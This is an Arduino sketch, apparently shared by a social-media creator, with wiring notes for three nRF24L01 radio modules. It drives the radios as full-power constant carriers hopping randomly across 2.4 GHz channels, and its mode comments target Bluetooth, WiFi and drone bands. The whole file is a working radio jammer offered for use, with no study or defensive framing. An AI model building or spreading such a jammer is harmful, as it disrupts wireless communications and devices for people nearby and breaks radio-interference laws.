// Tiktok: ex.fd.cn
// Only 2.4ghz

//  --Library:
//    |Select board
//    |RF24.h
//  --Setup (Nrf|ATmega328) (1 & Gnd // 2 & 3.3v):
//    |pin 5;6;7 connect to 15;16;17
//    |RF_1:
//       |3 & 28
//       |4 & 27
//    |RF_2:
//       |3 & 26
//       |4 & 25
//    |RF_3:
//       |3 & 24
//       |4 & 23

// Mode: |81:Bluetooth|15:Wifi|126:Drone|
#define Mode1 81
#define Mode2 81
#define Mode3 81

#include "RF24.h"
#include <SPI.h>
RF24 radio1(28, 27, 16000000);
RF24 radio2(26, 25, 16000000);
RF24 radio3(24, 23 ,16000000);
void SAtk() {
  if (radio1.begin()) {
    radio1.setAutoAck(false);
    radio1.stopListening();
    radio1.setRetries(0, 0);
    radio1.setPALevel(RF24_PA_MAX, true);
    radio1.setDataRate(RF24_2MBPS);
    radio1.setCRCLength(RF24_CRC_DISABLED);
    radio1.startConstCarrier(RF24_PA_MAX, 45);}
    else {Serial.println("N1 couldn't start !!!");}
  if (radio2.begin()) {
    radio2.setAutoAck(false);
    radio2.stopListening();
    radio2.setRetries(0, 0);
    radio2.setPALevel(RF24_PA_MAX, true);
    radio2.setDataRate(RF24_2MBPS);
    radio2.setCRCLength(RF24_CRC_DISABLED);
    radio2.startConstCarrier(RF24_PA_MAX, 45);}
    else {Serial.println("N2 couldn't start !!!");}
  if (radio3.begin()) {
    radio3.setAutoAck(false);
    radio3.stopListening();
    radio3.setRetries(0, 0);
    radio3.setPALevel(RF24_PA_MAX, true);
    radio3.setDataRate(RF24_2MBPS);
    radio3.setCRCLength(RF24_CRC_DISABLED);
    radio3.startConstCarrier(RF24_PA_MAX, 45);}
    else {Serial.println("N3 couldn't start !!!");}}
void setup() {
  Serial.begin(115200);
  Serial.println("By Cio1N, Tiktok: ex.fd.cn");
  SAtk();}
void loop() {
  radio1.setChannel(random(Mode1));
  radio2.setChannel(random(Mode2));
  radio3.setChannel(random(Mode3));}